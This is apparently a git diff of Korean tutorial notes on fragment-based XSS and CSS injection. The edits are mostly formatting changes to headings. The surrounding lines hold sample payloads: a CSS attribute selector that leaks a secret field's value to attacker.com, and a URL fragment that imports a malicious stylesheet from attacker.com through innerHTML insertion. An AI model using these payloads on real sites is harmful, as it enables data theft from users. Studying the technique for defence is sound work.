@@ -167,10 +167,10 @@ input[name="secret"][value^="dc"] { background: url(https://attacker.com/leak?q=
 
 ---
 
-## 공격 예제 😎
+## 😎 공격 예제 
 
 
-1️⃣ Fragment(#) 기반 XSS 구조
+#### 1️⃣ Fragment(#) 기반 XSS 구조
 
 #### URL 예시
 
@@ -197,11 +197,10 @@ document.body.innerHTML += fragment;  // DOM에 그대로 삽입 → CSS 성공
 https://example.com/page#<style>@import url("https://attacker.com/malicious.css");</style>
 ```
 
-
 [브라우저 URL]                   [서버 요청]             [클라이언트 JS]
 https://example.com/page#PAYLOAD  GET /page              window.location.hash -> DOM 삽입
 #<style>~      ❌ fragment 없음       document.body.innerHTML += fragment
-```
+
 
 * ❌: 서버에는 fragment 안감
 * ✔ : JS가 읽어서 DOM에 넣으면 공격 가능
@@ -210,7 +209,7 @@ https://example.com/page#PAYLOAD  GET /page              window.location.hash ->
 
 #### fragment 기반 XSS/CSSI 샘플
 
-1️⃣ HTML 샘플 (fragment 기반 CSSI)
+#### 1️⃣ HTML 샘플 (fragment 기반 CSSI)
 
 ```html
 <!-- 파일명: fragment-cssi.html -->
